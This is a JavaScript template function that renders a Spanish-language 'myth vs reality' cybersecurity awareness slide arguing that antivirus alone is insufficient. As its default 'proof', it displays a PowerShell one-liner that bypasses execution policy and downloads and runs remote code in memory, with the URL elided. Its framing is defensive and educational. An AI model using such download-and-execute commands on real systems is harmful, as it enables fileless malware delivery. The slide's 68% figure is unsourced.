/**
 * KR-CLIDN-38: MYTH vs REALITY
 * Split layout: Myth ❌ on left, Reality ✅ on right, proof below.
 */
export function render(data) {
    const TemplateUtils = window.TemplateUtils;
    const esc = TemplateUtils.escapeHTML;

    const d = {
        MYTH_TITLE: data.MYTH_TITLE || 'Mito Popular',
        MYTH_TEXT: data.MYTH_TEXT || '"Un antivirus es suficiente para estar protegido"',
        REALITY_TEXT: data.REALITY_TEXT || 'El 68% de ataques exitosos bypasean antivirus tradicionales usando fileless malware.',
        PROOF_CMD: data.PROOF_CMD || '$ powershell -ep bypass -nop IEX(New-Object Net.WebClient).DownloadString("http://...")',
        PROOF_EXPLAIN: data.PROOF_EXPLAIN || 'Este comando descarga y ejecuta código en memoria sin tocar disco. Antivirus no lo detecta.',
        VERDICT: data.VERDICT || '🛡️ Necesitas EDR + segmentación + hardening. Antivirus solo NO es suficiente.'
    };

    return `<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>KR-CLIDN-38</title>
    <style>
        .myth-grid {
            display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
        }
        .myth-card, .reality-card {
            border-radius: 16px; padding: 24px; display: flex;
            flex-direction: column; align-items: center; text-align: center;
        }
        .myth-card {
            background: rgba(255,0,85,0.05); border: 1px solid rgba(255,0,85,0.2);
        }
        .reality-card {
            background: rgba(0,255,157,0.05); border: 1px solid rgba(0,255,157,0.2);
        }
        .myth-icon { font-size: 82px; margin-bottom: 12px; }
        .myth-label {
            font-family: var(--font-mono); font-size: 34px; font-weight: 800;
            letter-spacing: 3px; margin-bottom: 12px;
        }
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="bg-glow"></div>

    <div class="safe-zone">
        ${TemplateUtils.renderBrandHeader()}
        ${TemplateUtils.renderMetaBadge(data)}

        <div class="mono" style="font-size:34px; color:var(--accent-color); letter-spacing:3px; margin-bottom:8px;">💥 MYTHBUSTER</div>
        <h1 class="cyber-title" style="font-size:71px;">${TemplateUtils.renderEditable('MYTH_TITLE', `${esc(d.MYTH_TITLE)}`, data._overrides)}</h1>

        <!-- Myth vs Reality Grid -->
        <div class="myth-grid">
            <div class="myth-card">
                <div class="myth-icon">❌</div>
                <div class="myth-label" style="color:var(--accent-color);">MITO</div>
                <div style="font-size:37px; color:#e2e8f0; line-height:1.5; font-style:italic;">${esc(d.MYTH_TEXT)}</div>
            </div>
            <div class="reality-card">
                <div class="myth-icon">✅</div>
                <div class="myth-label" style="color:var(--success-color);">REALIDAD</div>
                <div style="font-size:37px; color:#e2e8f0; line-height:1.5;">${esc(d.REALITY_TEXT)}</div>
            </div>
        </div>

        <!-- Proof -->
        <div class="terminal-window">
            <div class="term-header">
                <div class="term-dot red"></div>
                <div class="term-dot yellow"></div>
                <div class="term-dot green"></div>
                <span class="mono" style="font-size:34px; color:#888; margin-left:auto;">PRUEBA</span>
            </div>
            <div class="term-body" style="font-size:37px; font-weight:700; color:var(--accent-color);">
                ${esc(d.PROOF_CMD)}
            </div>
        </div>

        <div style="font-size:37px; color:#ccc; line-height:1.5; padding-left:14px; border-left:3px solid var(--success-color);">
            ${TemplateUtils.renderEditable('PROOF_EXPLAIN', `${esc(d.PROOF_EXPLAIN)}`, data._overrides)}
        </div>

        <!-- Verdict -->
        <div class="glass-panel" style="display:flex; gap:12px; align-items:center; border-color:rgba(0,255,157,0.15);">
            <span style="font-size:37px; color:#ffffff; line-height:1.4; font-weight:600;">${TemplateUtils.renderEditable('VERDICT', `${esc(d.VERDICT)}`, data._overrides)}</span>
        </div>
    </div>

    ${TemplateUtils.getAutoFitScript()}
</body>
</html>`;
}
